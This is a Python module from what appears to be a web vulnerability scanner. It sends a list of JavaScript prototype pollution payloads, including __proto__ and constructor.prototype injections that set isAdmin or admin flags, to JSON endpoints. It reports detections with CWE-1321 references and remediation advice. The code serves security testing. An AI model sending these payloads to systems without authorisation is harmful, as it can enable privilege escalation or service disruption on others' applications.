"""
GrotAssault — Prototype pollution payload checker.

Tests JSON-accepting endpoints for JavaScript prototype pollution by
injecting ``__proto__``, ``constructor.prototype``, and related payloads.

Client-side prototype pollution can lead to XSS, privilege escalation,
and denial of service. Server-side (Node.js) pollution can lead to RCE.

References:
  - CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
  - HackerOne reports on prototype pollution
"""

from __future__ import annotations

import json
import logging
from typing import Any, Dict, List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger("krumpa.grotassault.prototype_pollution")


# -- Payloads --------------------------------------------------------------

_POLLUTION_PAYLOADS: List[Dict[str, Any]] = [
    {
        "name": "__proto__ injection",
        "body": {"__proto__": {"krumpa_polluted": True}},
        "indicator": "krumpa_polluted",
    },
    {
        "name": "__proto__ nested",
        "body": {"user": {"__proto__": {"isAdmin": True}}},
        "indicator": "isAdmin",
    },
    {
        "name": "constructor.prototype",
        "body": {"constructor": {"prototype": {"krumpa_polluted": True}}},
        "indicator": "krumpa_polluted",
    },
    {
        "name": "__proto__ toString override",
        "body": {"__proto__": {"toString": "krumpa"}},
        "indicator": "krumpa",
    },
    {
        "name": "deep __proto__",
        "body": {"a": {"b": {"__proto__": {"krumpa_polluted": True}}}},
        "indicator": "krumpa_polluted",
    },
    {
        "name": "__proto__ status override",
        "body": {"__proto__": {"status": 200, "admin": True}},
        "indicator": "admin",
    },
]


class PrototypePollutionChecker:
    """Test JSON endpoints for prototype pollution vulnerabilities."""

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    async def check(self, target: Target) -> List[Finding]:
        """Send prototype pollution payloads to *target* and analyse responses."""
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            # Get baseline response
            try:
                baseline = await client.request(target.method, target.url)
                baseline_body = baseline.text
            except (httpx.HTTPError, OSError, ValueError):
                return findings

            for entry in _POLLUTION_PAYLOADS:
                try:
                    resp = await client.request(
                        target.method or "POST",
                        target.url,
                        json_body=entry["body"],
                        headers={"Content-Type": "application/json"},
                    )

                    # Check for pollution indicators
                    indicator = entry["indicator"]
                    polluted = False
                    evidence_detail = ""

                    # 1. Indicator appears in response but wasn't in baseline
                    if indicator in resp.text and indicator not in baseline_body:
                        polluted = True
                        evidence_detail = f"'{indicator}' appeared in response after injection"

                    # 2. Check if response JSON contains the polluted key
                    try:
                        resp_json = json.loads(resp.text)
                        if isinstance(resp_json, dict):
                            if self._deep_find(resp_json, indicator):
                                polluted = True
                                evidence_detail = f"Key '{indicator}' found in response JSON"
                    except (json.JSONDecodeError, TypeError):
                        pass

                    # 3. Server error (500) may indicate prototype was modified
                    if resp.status_code == 500 and baseline.status_code != 500:
                        findings.append(Finding(
                            title=f"Possible prototype pollution (server error) on {target.url}",
                            description=(
                                f"Payload '{entry['name']}' caused a 500 error, "
                                f"suggesting the server-side object model was disrupted. "
                                f"This may indicate prototype pollution."
                            ),
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=f"Payload: {json.dumps(entry['body'])}\nStatus: 500",
                            remediation=(
                                "Sanitize JSON input by stripping __proto__, constructor, "
                                "and prototype keys before processing. Use Object.create(null) "
                                "for safe objects. Consider using a schema validator."
                            ),
                            cwe=1321,
                            tags=["prototype-pollution", "server-error", "grotassault"],
                        ))
                        continue

                    if polluted:
                        findings.append(Finding(
                            title=f"Prototype pollution on {target.url}",
                            description=(
                                f"Payload '{entry['name']}' successfully polluted the "
                                f"object prototype. {evidence_detail}. "
                                f"This can lead to XSS, privilege escalation, or RCE."
                            ),
                            severity=Severity.HIGH,
                            target=target,
                            evidence=(
                                f"Payload: {json.dumps(entry['body'])}\n"
                                f"Detection: {evidence_detail}"
                            ),
                            remediation=(
                                "Sanitize JSON input by stripping __proto__, constructor, "
                                "and prototype keys. Use Object.create(null) or Map for "
                                "key-value stores. Freeze Object.prototype in Node.js."
                            ),
                            cwe=1321,
                            tags=["prototype-pollution", "confirmed", "grotassault"],
                        ))
                        break  # one confirmed finding per target

                except (httpx.HTTPError, OSError, ValueError):
                    continue

        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _deep_find(obj: Any, key: str) -> bool:
        """Recursively check if *key* exists in a nested dict."""
        if isinstance(obj, dict):
            if key in obj:
                return True
            return any(
                PrototypePollutionChecker._deep_find(v, key)
                for v in obj.values()
            )
        if isinstance(obj, list):
            return any(
                PrototypePollutionChecker._deep_find(item, key)
                for item in obj
            )
        return False
